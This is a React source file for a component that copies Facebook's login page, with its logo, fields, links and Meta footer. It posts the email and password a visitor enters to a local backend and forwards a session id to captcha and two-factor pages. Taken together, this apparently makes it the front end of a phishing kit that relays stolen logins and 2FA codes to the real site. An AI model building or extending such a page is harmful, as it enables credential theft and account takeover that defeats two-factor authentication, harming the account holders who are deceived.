import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './FacebookLogin.css';

const FacebookLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({});
  const navigate = useNavigate();

  const validate = () => {
    const errs = {};
    // simple email regex
    if (!/^[\w-.]+@[\w-]+\.[a-z]{2,}$/i.test(email)) {
      errs.email = 'Please enter a valid email address.';
    }
    if (password.length < 6) {
      errs.password = 'Password must be at least 6 characters.';
    }
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;

    try {
      // backend runs on port 8000, bypass CRA proxy
      const response = await fetch('http://localhost:8000/api/facebook/login', {
        method: 'POST',
        body: new FormData(e.target),
      });
      const data = await response.json();
      console.log('logged in', data);
      if (data.screenshots) {
        console.log('received', data.screenshots.length, 'screenshots');
        // attach to errors state so we can render them for debugging
        setErrors(prev => ({ ...prev, screenshots: data.screenshots }));
      }
      // if backend returned a two-step URL or next step indicator, navigate there
      if (data.success) {
        if (data.captcha) {
          // show captcha page instead of proceeding
          navigate('/captcha', { state: { session_id: data.session_id } });
        } else if (data.url && data.url.includes('two_step_verification')) {
          // forward session id so 2FA page can continue
          navigate('/2fa', { state: { session_id: data.session_id } });
        } else if (data.next_step === 'complete') {
          // maybe set some state, e.g. context or redirect home
          navigate('/');
        }
      } else {
        setErrors(prev => ({ ...prev, form: data.error || 'Login failed' }));
      }
    } catch (err) {
      console.error('login error', err);
    }
  };

  const renderScreenshots = () => {
    const arr = errors.screenshots || [];
    if (arr.length === 0) return null;
    return (
      <div className="screenshots-debug">
        {arr.map((s, idx) => (
          <div key={idx} className="screenshot-item">
            <div>{s.step}</div>
            <img
              src={`data:image/png;base64,${s.data}`}
              alt={s.step}
              style={{ maxWidth: '100%', marginTop: '4px' }}
            />
          </div>
        ))}
      </div>
    );
  };

  return (
    <div className="fb-login-container">
      <form className="fb-login-form" onSubmit={handleSubmit} noValidate>
        <img
          src="/images/facebook_logo.svg"
          alt="Facebook"
          className="fb-logo"
        />

        <div className="input-group">
          <input
            name="email"
            type="text"
            placeholder="Email or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={errors.email ? 'invalid' : ''}
          />
          {errors.email && <div className="error-msg">{errors.email}</div>}
        </div>

        <div className="input-group password-group">
          <input
            name="password"
            type={showPassword ? 'text' : 'password'}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={errors.password ? 'invalid' : ''}
          />
          <button
            type="button"
            className="show-toggle"
            onClick={() => setShowPassword((s) => !s)}
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
          {errors.password && <div className="error-msg">{errors.password}</div>}
        </div>

        <button type="submit" className="btn login-btn">
          Log In
        </button>

        <div className="helper-links">
          <a href="#" className="forgot-link">
            Forgotten account?
          </a>
        </div>

        <hr />

        <button type="button" className="btn create-btn">
          Create new account
        </button>
      </form>

      {renderScreenshots()}
      <footer className="fb-footer">
        <div className="footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Help</a>
          <a href="#">More</a>
        </div>
      </footer>
    </div>
  );
};

export default FacebookLogin;
